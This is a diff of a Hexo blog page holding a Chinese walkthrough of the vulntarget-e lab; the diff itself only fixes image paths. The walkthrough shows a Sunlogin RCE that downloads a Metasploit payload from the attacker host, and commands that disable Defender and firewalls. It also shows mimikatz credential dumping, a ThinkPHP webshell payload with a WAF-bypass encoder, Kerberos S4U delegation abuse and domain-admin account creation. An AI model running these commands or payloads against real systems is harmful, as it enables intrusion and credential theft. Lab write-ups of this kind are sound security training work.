@@ -149,100 +149,100 @@
   isShuoshuo: false
 }</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/toutou.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/b.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">rrc4'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">vulntarget-e</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">vulntarget-e</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-14T02:55:46.975Z" title="发表于 2024-11-14 10:55:46">2024-11-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-21T09:05:42.921Z" title="更新于 2024-11-21 17:05:42">2024-11-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="vulntarget-e-打靶"><a href="#vulntarget-e-打靶" class="headerlink" title="vulntarget-e 打靶"></a>vulntarget-e 打靶</h1><h2 id="1-外网靶机（win2016）"><a href="#1-外网靶机（win2016）" class="headerlink" title="1.外网靶机（win2016）"></a>1.外网靶机（win2016）</h2><p>端口扫描，49773端口存在向日葵服务</p>
 <p>扫描是否存在向日葵rce</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112123209675.png" alt="image-20241112123209675"></p>
+<p><img src="/posts/v-eImgs/image-20241112123209675.png" alt="image-20241112123209675"></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce">https://github.com/Mr-xn/sunlogin_rce</a></p>
 <p>尝试执行命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sunRce.exe -t rce -p 49773 -h 192.168.237.139 -c &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/v-eImgs.htm/image-20241112123339580.png" alt="image-20241112123339580"></p>
+<p><img src="/posts/v-eImgs/image-20241112123339580.png" alt="image-20241112123339580"></p>
 <p>生成msf木马  python开启http服务下载木马    有windows Defender（关闭） 关闭防火墙</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br><span class="line">sunRce.exe -t rce -p 49773 -h 192.168.237.139 -c &quot;curl -o c://bb.exe http://192.168.237.129/bind.exe&quot;</span><br><span class="line">sunRce.exe -t rce -p 49773 -h 192.168.237.139 -c &quot;set-MpPreference -DisableRealtimeMonitoring $true&quot;</span><br><span class="line">sunRce.exe -t rce -p 49773 -h 192.168.237.139 -c &quot;netsh advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure>
 
 <p>msf  开启监听 执行木马，成功收到会话</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112124428715.png" alt="image-20241112124428715"></p>
+<p><img src="/posts/v-eImgs/image-20241112124428715.png" alt="image-20241112124428715"></p>
 <p>看一下系统权限，不需要提权</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112124519183.png" alt="image-20241112124519183"></p>
+<p><img src="/posts/v-eImgs/image-20241112124519183.png" alt="image-20241112124519183"></p>
 <p>查一下ip信息，以及在不在域中 有乱码 chcp 65001</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br><span class="line">dir c://user </span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/v-eImgs.htm/image-20241112125736113.png" alt="image-20241112125736113"></p>
+<p><img src="/posts/v-eImgs/image-20241112125736113.png" alt="image-20241112125736113"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">存在 192.168.100.155/24 网段</span><br></pre></td></tr></table></figure>
 
 <p>添加路由</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112130021052.png" alt="image-20241112130021052"></p>
+<p><img src="/posts/v-eImgs/image-20241112130021052.png" alt="image-20241112130021052"></p>
 <p>加载mimikatz 看看能不能读取密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/v-eImgs.htm/image-20241112130526254.png" alt="image-20241112130526254"></p>
+<p><img src="/posts/v-eImgs/image-20241112130526254.png" alt="image-20241112130526254"></p>
 <p>破解一下hash</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112130619492.png" alt="image-20241112130619492"></p>
+<p><img src="/posts/v-eImgs/image-20241112130619492.png" alt="image-20241112130619492"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">开启3389服务  远连搜集信息</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d <span class="number">3389</span> /f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="number">1</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Remote Desktop&quot;</span> protocol=TCP dir=in localport=<span class="number">3389</span> action=allow</span><br></pre></td></tr></table></figure>
 
 <p>使用venom代理</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112133446266.png" alt="image-20241112133446266"></p>
+<p><img src="/posts/v-eImgs/image-20241112133446266.png" alt="image-20241112133446266"></p>
 <h2 id="2-Ubuntu"><a href="#2-Ubuntu" class="headerlink" title="2.Ubuntu"></a>2.Ubuntu</h2><p>挂代理扫描端口发现存活ip</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112133715850.png" alt="image-20241112133715850"></p>
+<p><img src="/posts/v-eImgs/image-20241112133715850.png" alt="image-20241112133715850"></p>
 <p>扫描目录没有进展，登录浏览器查看了一下浏览记录</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112134621981.png" alt="image-20241112134621981"></p>
+<p><img src="/posts/v-eImgs/image-20241112134621981.png" alt="image-20241112134621981"></p>
 <p>发现了三个记录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.131/</span><br><span class="line">http://192.168.100.131/vulntarget/public/</span><br><span class="line">http://192.168.100.131/vulntarget/public/index.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/v-eImgs.htm/image-20241112202651782.png" alt="image-20241112202651782"></p>
+<p><img src="/posts/v-eImgs/image-20241112202651782.png" alt="image-20241112202651782"></p>
 <p><strong>400</strong> 联系到前面给的域名 进行host碰撞 </p>
-<p><img src="/posts/v-eImgs.htm/image-20241112204140172.png" alt="image-20241112204140172"></p>
+<p><img src="/posts/v-eImgs/image-20241112204140172.png" alt="image-20241112204140172"></p>
 <p>最终找到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.131 -- www.cJO6w10YLS.com 协议：http:// 数据包大小：649 标题：vulntarget后台登录界面</span><br></pre></td></tr></table></figure>
 
 <p>修改<strong>hosts</strong>文件 将域名和<strong>ip</strong>做绑定 （挂代理访问）</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112231141382.png" alt="image-20241112231141382"></p>
+<p><img src="/posts/v-eImgs/image-20241112231141382.png" alt="image-20241112231141382"></p>
 <p>访问<strong><a target="_blank" rel="noopener" href="http://192.168.100.131/vulntarget/public/">http://192.168.100.131/vulntarget/public/</a></strong> 找到thinkphp框架</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112231437685.png" alt="image-20241112231437685"></p>
+<p><img src="/posts/v-eImgs/image-20241112231437685.png" alt="image-20241112231437685"></p>
 <p>网上找的payload被waf拦截了</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112232154615.png" alt="image-20241112232154615"></p>
+<p><img src="/posts/v-eImgs/image-20241112232154615.png" alt="image-20241112232154615"></p>
 <p>system还被禁用了</p>
-<p><img src="/posts/v-eImgs.htm/image-20241112232309947.png" alt="image-20241112232309947"></p>
+<p><img src="/posts/v-eImgs/image-20241112232309947.png" alt="image-20241112232309947"></p>
 <p>试着使用file_put_contents 写文件的payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>又被waf拦截了，先试试能不能写进去</p>
 <p>在本目录写文件会被拦截,上一级目录也会被拦截，最终在上两级目录写下</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113190345558.png" alt="image-20241113190345558"></p>
+<p><img src="/posts/v-eImgs/image-20241113190345558.png" alt="image-20241113190345558"></p>
 <p>因为还有宝塔waf，还要考虑绕waf, urldecode三次编码</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113192206132.png" alt="image-20241113192206132"></p>
+<p><img src="/posts/v-eImgs/image-20241113192206132.png" alt="image-20241113192206132"></p>
 <p>蚁剑加个编码器，挂上代理连蚁剑</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"></span><br><span class="line">  // ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">function forceEncode(s) &#123;</span><br><span class="line">  return Array.from(s).map(i=&gt;&#x27;%&#x27;+i.charCodeAt(0).toString(16).padStart(2,&#x27;0&#x27;)).join(&#x27;&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;</span><br><span class="line">  const payload = data[&#x27;_&#x27;]</span><br><span class="line">  data[pwd] = forceEncode(forceEncode(payload));</span><br><span class="line">  delete data[&#x27;_&#x27;];</span><br><span class="line">  console.log(data);</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>还要记得配置一下host 要不连不上</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113193440148.png" alt="image-20241113193440148"></p>
+<p><img src="/posts/v-eImgs/image-20241113193440148.png" alt="image-20241113193440148"></p>
 <p>翻到了一个key，直接ssh连接</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113201437794.png" alt="image-20241113201437794"></p>
+<p><img src="/posts/v-eImgs/image-20241113201437794.png" alt="image-20241113201437794"></p>
 <p>直接用key远连拿到root权限，进来先关闭一下防火墙</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ufw status			#查看防火墙状态</span><br><span class="line">ufw disable			#关闭防火墙</span><br><span class="line">iptables -A INPUT -j ACCEPT			#允许所有的入站连接和流量通过防火墙</span><br><span class="line">iptables -A OUTPUT -j ACCEPT			#允许所有的出站连接和流量通过防火墙</span><br></pre></td></tr></table></figure>
 
 <p>查看内网网段发现，发现192.168.88.100&#x2F;24 网段</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113201949530.png" alt="image-20241113201949530"></p>
+<p><img src="/posts/v-eImgs/image-20241113201949530.png" alt="image-20241113201949530"></p>
 <p>上传venom客户端再加一层代理 </p>
 <h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><p>上传fscan扫内网  存在445端口</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113210520170.png" alt="image-20241113210520170"></p>
+<p><img src="/posts/v-eImgs/image-20241113210520170.png" alt="image-20241113210520170"></p>
 <p>smb 爆破 试试</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113210655722.png" alt="image-20241113210655722"></p>
+<p><img src="/posts/v-eImgs/image-20241113210655722.png" alt="image-20241113210655722"></p>
 <p>有了账户密码横向移动</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113214212666.png" alt="image-20241113214212666"></p>
+<p><img src="/posts/v-eImgs/image-20241113214212666.png" alt="image-20241113214212666"></p>
 <p>ubuntu存在python  直接开启一个http服务传一个msf木马上去</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o ddd.exe http://xxx/ddd.exe</span><br></pre></td></tr></table></figure>
 
 <p>msf上线</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113220706330.png" alt="image-20241113220706330"></p>
+<p><img src="/posts/v-eImgs/image-20241113220706330.png" alt="image-20241113220706330"></p>
 <p>getsystem 抓一下密码</p>
 <p>抓到了一个密码先存起来</p>
-<p><img src="/posts/v-eImgs.htm/image-20241113220921050.png" alt="image-20241113220921050"></p>
+<p><img src="/posts/v-eImgs/image-20241113220921050.png" alt="image-20241113220921050"></p>
 <h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><p>非约束性委派</p>
 <p>上传Adfind  kekeo mimikatz   并开启3389</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查询域中配置非约束委派的主机</span><br><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br><span class="line">#查询域中配置非约束委派的服务账户</span><br><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br><span class="line">#</span><br><span class="line">AdFind.exe -h 10.0.10.10 -u win2008 -up qweASD123  -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line">cn distinguishedName msds-allowedtodelegateto：指定要返回的属性列表，包括 cn、distinguishedName 和 msds-allowedtodelegateto。</span><br><span class="line">该命令的目的是在指定的 Active Directory 中查找满足条件的委派账户，并返回这些账户的 cn、distinguishedName 和 msds-allowedtodelegateto 属性值。</span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/v-eImgs.htm/image-20241114174952407-17315850459991-17315855761903.png" alt="image-20241114174952407-17315850459991"></p>
+<p><img src="/posts/v-eImgs/image-20241114174952407-17315850459991-17315855761903.png" alt="image-20241114174952407-17315850459991"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#请求约束性委派用户的TGT</span><br><span class="line">tgt::ask /user:win2008 /domain:vulntarget.com /password:qweASD123 /ticket:ash.kirbi</span><br><span class="line">#伪造S4U请求并访问CIFS服务</span><br><span class="line">tgs::s4u /tgt:TGT_win2008@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/WIN-1PV25H8UJPN.vulntarget.com</span><br></pre></td></tr></table></figure>
 
 <p>利用<code>mimikatz</code>导入S4U2proxy阶段生成的ST并访问域控10.10主机</p>
@@ -251,11 +251,11 @@
 
 
 <p>添加账户，横向移动</p>
-<p><img src="/posts/v-eImgs.htm/image-20241114175137674-17315855558262.png" alt="image-20241114175137674"></p>
+<p><img src="/posts/v-eImgs/image-20241114175137674-17315855558262.png" alt="image-20241114175137674"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user admin admin123 /add /domain			#创建一个名为 &quot;admin&quot; 的用户，并将其添加到域中。用户的密码为 &quot;admin&quot;。使用 /domain 参数指定在域中执行操作</span><br><span class="line">net group &quot;domain admins&quot; admin /add /domain			#将用户 &quot;admin&quot; 添加到 &quot;domain admins&quot; 组中。使用 /domain 参数指定在域中执行操作。此命令假设 &quot;domain admins&quot; 组已经存在。</span><br><span class="line">net group &quot;domain admins&quot; /domain			#显示 &quot;domain admins&quot; 组的成员列表。使用 /domain 参数指定在域中执行操作。该命令并未指定要添加或删除成员，只是查看组的成员信息。</span><br></pre></td></tr></table></figure>
 
 <p>挂代理横向移动</p>
-<p><img src="/posts/v-eImgs.htm/image-20241114175404122-17315855419591.png" alt="image-20241114175404122"></p>
+<p><img src="/posts/v-eImgs/image-20241114175404122-17315855419591.png" alt="image-20241114175404122"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py admin:admin123@10.10.10.10</span><br></pre></td></tr></table></figure>
 
 <p>至此拿到域控权限</p>
